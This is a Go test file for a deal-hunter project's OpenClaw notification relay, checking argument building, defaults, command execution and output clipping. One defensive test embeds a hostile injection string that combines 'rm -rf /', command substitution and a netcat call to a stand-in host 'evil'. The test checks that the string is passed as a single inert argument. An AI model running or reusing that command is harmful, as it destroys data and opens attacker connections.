package notify

import (
	"context"
	"runtime"
	"strings"
	"testing"

	"github.com/xiabee/deal-hunter/internal/config"
)

func TestRelayBuildsFixedArgv(t *testing.T) {
	r, err := NewOpenClawRelay(config.OpenClaw{
		Enabled: true, Relay: true, Command: "openclaw",
		Args: []string{"--profile", "default"}, Channel: "feishu", Target: "chat:123",
	})
	if err != nil {
		t.Fatalf("NewOpenClawRelay: %v", err)
	}
	if !r.Ready() {
		t.Fatal("a configured target should report ready")
	}
	msg := NewMessage(KindAlert, "🆓 免费羊毛 · GLM-5.3-flash", sampleDeal())
	args := r.Args(msg)
	want := []string{"--profile", "default", "message", "send", "--channel", "feishu", "--target", "chat:123", "--message"}
	for i, w := range want {
		if args[i] != w {
			t.Fatalf("argv[%d] = %q, want %q (full: %v)", i, args[i], w, args)
		}
	}
	body := args[len(args)-1]
	for _, frag := range []string{"GLM-5.3-flash", "https://example.com/glm-free", "92"} {
		if !strings.Contains(body, frag) {
			t.Errorf("message body missing %q: %s", frag, body)
		}
	}
}

// The relay must never route text through a shell: hostile feed titles are
// passed as a single inert argument.
func TestRelayNeutralisesShellMetacharacters(t *testing.T) {
	r, _ := NewOpenClawRelay(config.OpenClaw{Command: "openclaw", Target: "chat:1", Channel: "feishu"})
	evil := "rm -rf / ; echo pwned $(id) `id` | nc evil 4444"
	args := r.Args(NewMessage(KindAlert, evil))
	if args[len(args)-1] != evil {
		t.Fatalf("message was split or altered: %q", args[len(args)-1])
	}
	joined := strings.Join(args, " ")
	if strings.Contains(joined, "sh -c") {
		t.Fatal("relay must not use a shell")
	}
}

func TestRelayDefaults(t *testing.T) {
	r, err := NewOpenClawRelay(config.OpenClaw{Relay: true})
	if err != nil {
		t.Fatal(err)
	}
	if r.Name() != "openclaw-relay" {
		t.Errorf("name = %s", r.Name())
	}
	if r.Ready() {
		t.Error("no target means not ready")
	}
	err = r.Send(context.Background(), NewMessage(KindTest, "x"))
	if err == nil || !strings.Contains(err.Error(), config.EnvOpenClawTarget) {
		t.Errorf("error should name the env var to set, got %v", err)
	}
	args := r.Args(NewMessage(KindTest, "hello"))
	if args[0] != "message" || args[1] != "send" || args[2] != "--channel" || args[3] != "feishu" {
		t.Errorf("default channel should be feishu: %v", args)
	}
}

func TestRelayExecutesConfiguredCommand(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("posix helpers only")
	}
	r, _ := NewOpenClawRelay(config.OpenClaw{Relay: true, Command: "/bin/echo", Target: "chat:1", Channel: "feishu"})
	if err := r.Send(context.Background(), NewMessage(KindAlert, "标题", sampleDeal())); err != nil {
		t.Fatalf("echo should succeed: %v", err)
	}
	bad, _ := NewOpenClawRelay(config.OpenClaw{Relay: true, Command: "/bin/false", Target: "chat:1"})
	if err := bad.Send(context.Background(), NewMessage(KindAlert, "x")); err == nil {
		t.Error("a failing command must be reported")
	}
	missing, _ := NewOpenClawRelay(config.OpenClaw{Relay: true, Command: "/nonexistent/openclaw", Target: "chat:1"})
	err := missing.Send(context.Background(), NewMessage(KindAlert, "x"))
	if err == nil || !strings.Contains(err.Error(), "openclaw relay") {
		t.Errorf("expected a wrapped relay error, got %v", err)
	}
}

func TestClipOutputBoundsRelayErrors(t *testing.T) {
	long := strings.Repeat("x", 5000)
	if got := clipOutput(long); len(got) > 700 {
		t.Errorf("clipped output too long: %d", len(got))
	}
	if clipOutput("  \n trimmed \n ") != "trimmed" {
		t.Error("clip should trim")
	}
}
